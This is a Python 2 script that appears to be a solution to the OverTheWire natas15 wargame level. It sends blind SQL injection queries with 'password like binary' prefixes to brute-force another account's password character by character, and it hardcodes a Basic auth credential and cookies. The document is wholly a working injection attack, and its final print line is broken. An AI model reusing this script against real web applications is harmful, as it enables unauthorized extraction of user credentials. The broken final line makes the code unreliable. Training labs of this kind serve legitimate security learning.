#!/usr/bin/python

import urllib
import urllib2


# HTTP headers
target = 'http://natas15.natas.labs.overthewire.org/index.php'
cookie = '__cfduid=d28139f1f9a61a9eb33d617e1c0b4549e1491454679; __utma=176859643.239647970.1491454678.1491454678.1491454678.1; __utmz=176859643.1491454678.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)'
authorization = 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
referrer = 'natas15.natas.labs.overthewire.org'
page_content = ''

# Assuming these characters. From previous passwords.
alphabet_numbers = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
's','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L',
'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5',
'6','7','8','9']

# this will get the final password
password = ''

#assuming 32 of length as previous passwords
for i in range(0,32):
    print 'Current: %d' %i
    for ii in range(0, len(alphabet_numbers)):
        q = 'natas16" and password like "' + password + (alphabet_numbers[ii]) +'%" #' 
        q = "natas16%22+and+password+like+binary+%22" + password+ alphabet_numbers[ii] +"%25%22%23"
        exploit = target + '?username=' + q
        request = urllib2.Request(exploit)
        request.add_header('Cookie', cookie)
        request.add_header('Referrer', referrer)
        request.add_header('Authorization', authorization)
        try:
            response = urllib2.urlopen(request)
            page_content = response.read()
            #print page_content
        except urllib2.HTTPError, e:
            print e.reason
        if "This user exists." in page_content:
            password = password + alphabet_numbers[ii]
            print password
            break
        #print exploit
        #request = urllib2.Request(target , data6)

print "PASSWORD = " %(password)
